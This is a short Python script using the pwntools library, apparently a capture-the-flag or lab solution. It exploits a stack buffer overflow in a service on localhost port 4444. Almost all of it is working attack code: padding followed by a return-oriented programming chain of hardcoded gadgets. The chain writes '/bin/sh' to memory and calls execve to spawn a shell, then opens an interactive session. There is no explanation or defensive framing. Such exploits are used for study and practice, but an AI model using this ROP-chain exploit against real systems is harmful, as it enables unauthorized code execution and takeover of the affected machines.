from pwn import *


#context.log_level = 'DEBUG'


ret = p64(0x401cf1)

pop_rdi = p64(0x0000000000401d3a)
pop_rax = p64(0x00000000004246db)
pop_rdx = p64(0x0000000000401d3c)
pop_rsi = p64(0x0000000000401d3e)
syscall = p64(0x000000000040142f)
mov_rdi_rdx = p64(0x0000000000459ff3)

p = remote("localhost", 4444)
p.sendline(b"1300")

payload = b"A"*1076 #+ pop_rdi + sh + ret + system

#Put /bin/sh at 0x4b2000
payload += pop_rdx
payload += b"/bin/sh\x00"
payload += pop_rdi
payload += p64(0x4b2000) #heap
payload += mov_rdi_rdx

#Execve
payload += pop_rax
payload += p64(0x3b)
payload += pop_rdi
payload += p64(0x4b2000)
payload += pop_rsi
payload += p64(0x0)
payload += pop_rdx
payload += p64(0x0)
payload += syscall

tmp  =  b"D"*(1300 - len(payload))

p.send(payload + tmp)
p.interactive()
